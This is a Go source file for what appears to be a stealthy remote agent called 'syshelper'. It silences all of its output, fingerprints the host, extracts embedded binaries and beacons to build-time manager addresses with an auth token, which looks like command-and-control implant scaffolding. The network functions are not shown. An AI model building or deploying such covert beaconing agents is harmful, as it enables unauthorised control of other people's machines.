package main

import (
	"crypto/sha256"
	"flag"
	"fmt"
	"os"
	"strings"
)

// Build-time values injected via -ldflags
var (
	primaryManager  string
	fallbackManager string
	authToken       string
	agentVersion    string
	goArm           string // set for arm builds: "6" or "7"
)

// machineID is read once at startup and held in memory only.
var machineID string

func main() {
	// ── CLI flags ─────────────────────────────────────────────────────────────
	versionFlag := flag.Bool("version", false, "Print agent version and exit")
	insecureFlag := flag.Bool("insecure", false, "Skip TLS certificate verification (local dev only)")
	flag.Parse()

	if *versionFlag {
		fmt.Println("syshelper", agentVersion)
		os.Exit(0)
	}

	// ── Silence all output ────────────────────────────────────────────────────
	devNull, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
	if err == nil {
		os.Stdout = devNull
		os.Stderr = devNull
	}

	// ── HTTP client ───────────────────────────────────────────────────────────
	initHTTPClient(*insecureFlag)

	// ── Machine identity ──────────────────────────────────────────────────────
	machineID = readMachineID()

	// ── Extract embedded binaries ─────────────────────────────────────────────
	if err := extractBinaries(); err != nil {
		os.Exit(1)
	}

	// ── Session recovery ──────────────────────────────────────────────────────
	recoverSession()

	// ── Signal handler (runs in background) ───────────────────────────────────
	go handleSignals()

	// ── Read hostname ─────────────────────────────────────────────────────────
	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = machineID[:8]
	}

	// ── Beacon loop (blocks forever) ──────────────────────────────────────────
	runBeaconLoop(hostname)
}

// readMachineID reads /etc/machine-id; falls back to hostname+cpuinfo hash.
func readMachineID() string {
	data, err := os.ReadFile("/etc/machine-id")
	if err == nil {
		id := strings.TrimSpace(string(data))
		if id != "" {
			return id
		}
	}

	// Fallback: hash of hostname + /proc/cpuinfo
	hostname, _ := os.Hostname()
	cpuinfo, _ := os.ReadFile("/proc/cpuinfo")
	h := sha256.Sum256([]byte(hostname + string(cpuinfo)))
	return fmt.Sprintf("%x", h)
}
